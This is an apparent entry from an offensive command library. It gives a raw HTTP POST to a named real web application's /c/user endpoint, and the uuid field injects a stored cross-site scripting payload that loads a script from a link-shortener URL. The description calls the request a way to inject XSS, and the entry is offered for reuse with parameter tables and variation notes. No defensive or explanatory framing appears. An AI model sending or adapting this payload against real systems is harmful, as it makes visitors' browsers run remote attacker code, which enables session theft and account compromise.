---
data: >-
  POST /c/user HTTP/1.1

  Host: app.upserve.com

  Accept: application/json

  Accept-Language: en-US,en;q=0.5

  X-Requested-With: XMLHttpRequest

  Content-Type: application/x-www-form-urlencoded; charset=UTF-8

  Referer: https://app.upserve.com/settings/account

  Content-Length: 134

  Content-Type: text/plain;charset=UTF-8

  DNT: 1

  Connection: close


  uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR
  EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
tags:
  - http
  - post
  - xss
type: command
executor: bash
platforms:
  - Web
id: 4df79ef2-85d8-4c4a-bc54-81acaa2ce93d
created_at: '2025-12-13T23:56:20.199Z'
updated_at: '2025-12-13T23:56:20.199Z'
verified: false
validated: true
submitted: true
---
# POST Malicious UUID Form-Urlencoded

## Command

```bash
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

## Description

Sends a POST request to create a user with a custom malicious UUID to inject XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `uuid` | Injects the XSS payload | Yes |
| `email` | Specifies the user's email | Yes |
| `brand_pretty_url` | Specifies the brand URL | Yes |

## Examples

### Basic Usage

```bash
POST /c/user HTTP/1.1
Host: app.upserve.com
... (as above)
```

### Advanced Usage

Modify headers or payload for variations.

## Expected Output

HTTP response confirming user creation with the provided UUID.

## Related

- [[commands/post-malicious-uuid-json]]
- [[procedures/Submit-Malicious-UUID-via-POST]]
